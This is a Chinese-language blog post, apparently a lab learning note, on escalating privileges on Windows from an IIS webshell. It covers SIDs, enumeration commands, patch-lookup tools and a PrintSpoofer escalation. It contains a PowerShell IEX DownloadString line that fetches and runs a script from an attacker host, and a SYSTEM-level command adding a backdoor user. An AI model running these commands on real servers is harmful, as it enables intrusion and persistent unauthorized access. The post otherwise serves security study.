@@ -1,0 +1,2246 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="windows提权, 晓莎K&#39;s blog">
+    <meta name="description" content="windows提权
+
+windows基础知识一些windows指令在15-1中具体写了
+用户和组在windows不用的用户有着不同的权限，权限主要包括有：完全控制、修改、读取和执行、列出文件夹内容、读取、写入。
+超级管理员和system用户">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>windows提权 | 晓莎K&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="晓莎K's blog" type="application/atom+xml">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">晓莎K&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">晓莎K&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/0x00xiaoshaK" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/0x00xiaoshaK" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">windows提权</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+    height: calc(100vh - 250px);
+    overflow: scroll;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/windows%E6%8F%90%E6%9D%83/">
+                                <span class="chip bg-color">windows提权</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%8F%90%E6%9D%83/" class="post-category">
+                                提权
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-12-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    35 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><span id="more"></span>
+
+<h2 id="windows基础知识"><a href="#windows基础知识" class="headerlink" title="windows基础知识"></a>windows基础知识</h2><p>一些windows指令在15-1中具体写了</p>
+<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><p>在windows不用的用户有着不同的权限，权限主要包括有：完全控制、修改、读取和执行、列出文件夹内容、读取、写入。</p>
+<p>超级管理员和system用户权限最高</p>
+<p><strong>内置用户：</strong></p>
+<ul>
+<li>Administrator，系统管理员账号，拥有完全控制权</li>
+<li>guest，来宾账号，提供访问共享资源的网络用户使用，仅具有基本权限，默认被禁用</li>
+</ul>
+<p>用户也可以属于多个用户组，常见的用户组是 管理组(Administrators)、普通用户组（Users）、iis用户组（IIS_IUSRS）、来宾组（Guests）、远程登录组（Remote Desktop Users）</p>
+<p><strong>内置用户组：</strong></p>
+<ul>
+<li>administrators，管理员组</li>
+<li>users组，新建用户默认所属的组</li>
+<li>guests组，权限最低</li>
+<li>iis_users组 Internet 信息服务使用的内置组。</li>
+</ul>
+<p><strong>用户信息的详细解析：</strong></p>
+<p>whoami指令</p>
+<pre class="line-numbers language-none"><code class="language-none">whoami /?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>输入whoami /?会出现以下信息</p>
+<pre class="line-numbers language-none"><code class="language-none">WhoAmI 有三种使用方法:
+
+语法 1:
+    WHOAMI [/UPN | /FQDN | /LOGONID]
+
+语法 2:
+    WHOAMI { [/USER] [/GROUPS] [/CLAIMS] [/PRIV] } [/FO format] [/NH]
+
+语法 3:
+    WHOAMI /ALL [/FO format] [/NH]
+
+描述:
+    这个工具可以用来获取本地系统上当前用户(访问令牌)的用户名和组信息，
+    以及相应的安全标识符(SID)、声明、
+    本地系统上当前用户的权限、登录标识符(登录 ID)
+    。例如，谁是当前已登录的用户?
+    用户名。
+
+参数列表:
+    /UPN                    用用户主体 (User Principal) 格式显示用户名
+                            名称 (UPN)格式。
+
+    /FQDN                   用完全合格的 (Fully Qualified) 格式显示用户名
+                            可分辨名称(FQDN) 格式。
+
+    /USER                   显示当前用户的信息以及安全标识符 (SID)。
+
+    /GROUPS                 显示当前用户的组成员信息、帐户类型和安全
+                            标识符 (SID) 和属性。
+
+    /CLAIMS                 显示当前用户的声明，
+                            包括声明名称、标志、类型和值。
+
+    /PRIV                   显示当前用户的安全特权
+
+                            。
+
+    /LOGONID               显示当前用户的登录 ID。
+
+    /ALL                    显示当前用户名、所属的组
+                            以及安全等级
+                            当前用户访问令牌的标识符(SID)、
+                            声明和权限。
+
+    /FO       format        指定要显示的输出格式。
+                            有效值为 TABLE、LIST、CSV。
+                            列标题未使用 CSV
+                            格式显示。默认格式为 TABLE。
+
+    /NH                     指定不应在输出中显示
+                            列标题。此参数仅对
+                            TABLE 和 CSV 格式有效。
+
+    /?                     显示此帮助消息。
+
+Examples:
+    WHOAMI
+    WHOAMI /UPN
+    WHOAMI /FQDN
+    WHOAMI /LOGONID
+    WHOAMI /USER
+    WHOAMI /USER /FO LIST
+    WHOAMI /USER /FO CSV
+    WHOAMI /GROUPS
+    WHOAMI /GROUPS /FO CSV /NH
+    WHOAMI /CLAIMS
+    WHOAMI /CLAIMS /FO LIST
+    WHOAMI /PRIV
+    WHOAMI /PRIV /FO TABLE
+    WHOAMI /USER /GROUPS
+    WHOAMI /USER /GROUPS /CLAIMS /PRIV
+    WHOAMI /ALL
+    WHOAMI /ALL /FO LIST
+    WHOAMI /ALL /FO CSV /NH
+    WHOAMI /?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="windows的sid详解"><a href="#windows的sid详解" class="headerlink" title="windows的sid详解"></a>windows的sid详解</h2><p>windows的安全性主要依赖于几个基本元素：访问令牌、SID、安全描述符、访问控制表、密码。</p>
+<p>访问令牌：访问令牌在本质上定义了两 上“P”：Permissions（权限）和Privilege（特权）。两者区别并不明显。访问令牌的内容和功能由用户的SID、组的SID、登录 SID、用户特权、默认所有者、SID、默认组SID、默认DACL、起源进程、令牌类型、模拟级别、受限SID。</p>
+<p>权限：一个用户进程在接触一个对象时，“安全性参考监视器”将访问令牌中的SID与“对象访问控制列表（ACL）”中的SID匹配。可能出现的两种情况：</p>
+<ol>
+<li>如果没有匹配，就拒绝用户访问，这称为“隐式拒绝（implici deny）”;</li>
+<li>如果有一个区配，就将与ACK中的条目关联的权限授予给用户。</li>
+</ol>
+<p>这可能是Allow,也可能是一个Deny权限。在两个权限都直接指派给对象的前提下，Deny权限将优先于Allow权限（在对待继承的权限时，采取的方式稍有不同）</p>
+<p> SID：一个典型的SID：S－1-5-21-1683771068-12213551888-624655398-1001。它遵循的模式是：S－R－IA－SA－SA－RID。下面是具体解释：</p>
+<ol>
+<li><p>  字母S指明这是一个SID标识符，它将数字标记为一个SID。</p>
+</li>
+<li><p>  R代表Revision（修订），Windows生成的所有SID都使用修订级别 1。</p>
+</li>
+<li><p>  IA代表颁发机构。在Widnwos中，几乎所有SID都指定NT机构作为颁发机构，它的ID编号为5.但是，代表已知组和账户的SID例外。</p>
+</li>
+<li><p>  SA代表一个子机构。SA指定特殊的组或职能。</p>
+</li>
+</ol>
+<p>   例如、21表明SID由一个域控制器或者一台单机颁发。随后的一长串数字（1683771068-12213551888-624655398）就是颁发SID的那个域或机器的SA。</p>
+<ol start="5">
+<li>  RID是指相对ID（RID）、是SA所指派的一个惟一的、顺序的编号、代表一个安全主体（比如一个用户、计算机或组）</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers[">安全标识符</a></p>
+<h2 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h2><p>提权是指把普通用户的权限进行提升，通过是各种漏洞提升webshell权限以夺得服务器权限。</p>
+<p>webshell的权限根据不同的中间件权限也有所不同，如没经过特殊设置，webshell的权限是继承该中间件的权限。</p>
+<p>webshell的默认权限</p>
+<p> 从图中可以看到webshell的权限是iis_users组</p>
+<p><img src="/2021/12/28/day37/image-20220208115236511.png" alt="image-20220208115236511"></p>
+<h3 id="提权常用方法"><a href="#提权常用方法" class="headerlink" title="提权常用方法"></a>提权常用方法</h3><ul>
+<li>漏洞提权</li>
+<li>windwos特性提权</li>
+<li>第三方组件提权</li>
+<li>数据库提权</li>
+<li>ftp提权</li>
+</ul>
+<h3 id="提权常用命令"><a href="#提权常用命令" class="headerlink" title="提权常用命令"></a>提权常用命令</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr OS #获取系统版本信息 
+
+systeminfo&amp;&amp;wmic product get name,version&amp;&amp;wmic nic where PhysicalAdapter=True 
+
+get MACAddress,Name&amp;&amp;wmic NICCONFIG WHERE IPEnabled=true GET IPAddress #检测系统软件包
+
+hostname #获取主机名称 
+
+whoami /all #获取当前用户的详细信息 
+
+whoami /priv #显示当前用户的安全特权 
+
+net start #查看服务 
+
+quser or query user #获取在线用户 
+
+netstat -ano | findstr 3389 #获取rdp连接来源IP 
+
+dir c:\programdata\ #分析安装杀软 
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn #列出已安装的补丁 
+
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" 
+
+"Server\WinStations\RDP-Tcp /v PortNumber #获取远程端口 
+
+tasklist /svc | find "TermService" #获取服务pid
+
+netstat -ano |find "pid" #获取远程端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="windows提权辅助脚本"><a href="#windows提权辅助脚本" class="headerlink" title="windows提权辅助脚本"></a>windows提权辅助脚本</h3><p>检测系统补丁脚本 <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester">https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester</a></p>
+<p>查看补丁 <a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
+<p>windows 内核提权exp <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p>在线提权利用查询 <a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p>
+<p> <a target="_blank" rel="noopener" href="http://bugs.hacking8.com/tiquan/">提权辅助网页 (hacking8.com)</a></p>
+<h3 id="windows提权流程"><a href="#windows提权流程" class="headerlink" title="windows提权流程"></a>windows提权流程</h3><p>能够执行cmd命令-&gt;是否打补丁-&gt;补丁对应exp-&gt;获取服务器权限</p>
+<p>执行命令的时候 aspx-&gt;php和asp</p>
+<p>如果管理员删除服务器组件 wscript.shell 无法在asp执行cmd命令，这个时候可以使用aspx的后门查看是否有权限执行cmd命令</p>
+<h3 id="补丁查询"><a href="#补丁查询" class="headerlink" title="补丁查询"></a>补丁查询</h3><h4 id="hacking8在线查询补丁"><a href="#hacking8在线查询补丁" class="headerlink" title="hacking8在线查询补丁"></a>hacking8在线查询补丁</h4><pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; c:\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220208121157795.png" alt="image-20220208121157795"></p>
+<h4 id="wesng查询补丁"><a href="#wesng查询补丁" class="headerlink" title="wesng查询补丁"></a>wesng查询补丁</h4><p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<pre class="line-numbers language-none"><code class="language-none">python wes.py --update-wes #更新
+pip3 install chardet #下载包 
+python wes.py c:\sys.txt #检测补丁<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220208122410524.png" alt="image-20220208122410524"></p>
+<h4 id="WindowsVulnScan-查询补丁"><a href="#WindowsVulnScan-查询补丁" class="headerlink" title="WindowsVulnScan 查询补丁"></a>WindowsVulnScan 查询补丁</h4><p><a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
+<p>原理：</p>
+<ol>
+<li><p>搜集CVE与KB的对应关系。首先在微软官网上收集CVE与KB对应的关系，然后存储进数据库中</p>
+</li>
+<li><p>查找特定CVE网上是否有公开的EXP</p>
+</li>
+<li><p>利用powershell脚本收集主机的一些系统版本与KB信息</p>
+</li>
+<li><p>利用系统版本与KB信息搜寻主机上具有存在公开EXP的</p>
+</li>
+</ol>
+<p>使用：</p>
+<p>1.首先运行powershell脚本 KBCollect.ps 收集一些信息 运行后在目录下生成kb.json</p>
+<pre class="line-numbers language-none"><code class="language-none">.\KBCollect.ps1 
+Set-ExecutionPolicy -Scope CurrentUser remotesigned<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>打开cmd，运行powershell，将工具中的KBCollect.ps1 拖入发现报错，我们找到方法bypass掉，用上面第二行的命令，之后再次运行KBCollect.ps1 就成功了，我们在当前用户下看到生成了json文件</p>
+<p><img src="/2021/12/28/day37/image-20220208140211715.png" alt="image-20220208140211715"></p>
+<p><img src="/2021/12/28/day37/image-20220208140339958.png" alt="image-20220208140339958"></p>
+<p>2.将运行后产生的 KB.json 文件移动到 cve-check.py 所在的目录</p>
+<p>3.打开kali，监听80端口，将修改后的脚本放到桌面，访问kali ip</p>
+<p><img src="/2021/12/28/day37/image-20220208141256194.png" alt="image-20220208141256194"></p>
+<p>说明此脚本可以访问</p>
+<p>4.在asp中执行命令，执行完成后会在目录生成文件</p>
+<pre class="line-numbers language-none"><code class="language-none">Powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/KBCollect.ps1 ')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220208142455949.png" alt="image-20220208142455949"></p>
+<p>看到生成了kb.json</p>
+<p><img src="/2021/12/28/day37/image-20220208143536980.png" alt="image-20220208143536980"></p>
+<p>将此文件放入工具中</p>
+<p>5.运行工具</p>
+<pre class="line-numbers language-none"><code class="language-none">python cve-check.py -C -f KB.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220208143920886.png" alt="image-20220208143920886"></p>
+<h3 id="查询可写目录或文件"><a href="#查询可写目录或文件" class="headerlink" title="查询可写目录或文件"></a>查询可写目录或文件</h3><p>在确定可以执行cmd命令时，有些服务器会对目录进行权限设置，导致iis_user用户组没有权限对常见的目录进行写入和读取</p>
+<p>这时可以用扫描可写目录脚本对目录进行遍历扫描，得到可写目录 上传或下载 提 权exp 或替换文件 进行利用。</p>
+<p>常见的脚本有</p>
+<ul>
+<li>wt.asp </li>
+<li>net版本的wt.aspx </li>
+</ul>
+<p>wt.asp，红色表示文件可替换 蓝色表示目录可写</p>
+<p><img src="/2021/12/28/day37/image-20220208145408817.png" alt="image-20220208145408817"></p>
+<p><img src="/2021/12/28/day37/image-20220208145443162.png" alt="image-20220208145443162"></p>
+<p>wt.aspx，因为net的权限比 asp大，而且能访问注册表，所以除了常规扫描目录之外，还会读取注册表软件目录进行目录扫描。</p>
+<p><img src="/2021/12/28/day37/image-20220208145651832.png" alt="image-20220208145651832"></p>
+<h2 id="windows常用提权"><a href="#windows常用提权" class="headerlink" title="windows常用提权"></a>windows常用提权</h2><p>通过上面的补丁查询，列出可用的exp，在webshell里使用提权exp对服务器进行提权。</p>
+<h3 id="CVE-2016-3225（MS16-075）提权"><a href="#CVE-2016-3225（MS16-075）提权" class="headerlink" title="CVE-2016-3225（MS16-075）提权"></a>CVE-2016-3225（MS16-075）提权</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块(SMB) 中存在特权提升漏洞。</p>
+<p>成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。</p>
+<p>若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
+<p>此更新通过更正 Windows 服务器消息块 (SMB) 服务器处理凭据转发请求的方式来修复此漏洞。</p>
+<p>注：烂土豆(Rotten Potato)提权是一个本地提权，是针对本地用户的，不能用于域用户</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul>
+<li>Windows Vista</li>
+<li>Windows Server 2008</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows Server 2012 </li>
+<li> Windows Server 2012 R2</li>
+<li>Windows Server 2012</li>
+<li>Windows Server 2012 R2</li>
+<li>Windows 7</li>
+<li>Windows 8.1</li>
+<li>Windows RT 8.1</li>
+<li>Windows 10</li>
+</ul>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>利用文件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">GitHub - itm4n/PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019</a></p>
+<p>下载文件 <a target="_blank" rel="noopener" href="https://github.com/uknowsec/JuicyPotato">https://github.com/uknowsec/JuicyPotato</a> 上传到webshell的可执行目录</p>
+<p>我们这里使用PrintSpoofer64.exe</p>
+<p>查询后发现 C:\Windows\debug\WIA\ 目录是可执行的，上传文件到此目录下</p>
+<p><img src="/2021/12/28/day37/image-20220213105556888.png" alt="image-20220213105556888"></p>
+<p>记录下文件路径 C:\Windows\debug\WIA\PrintSpoofer64.exe</p>
+<p>执行完后，权限为系统权限</p>
+<p><img src="/2021/12/28/day37/image-20220213111533168.png" alt="image-20220213111533168"></p>
+<p>如果不在此目录下，为iis组权限</p>
+<p><img src="/2021/12/28/day37/image-20220213111555323.png" alt="image-20220213111555323"></p>
+<p>在cmdshell中提权，-h可查看使用帮助</p>
+<p><img src="/2021/12/28/day37/image-20220213105647042.png" alt="image-20220213105647042"></p>
+<pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "net user xiaoshaK 123456 /add "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
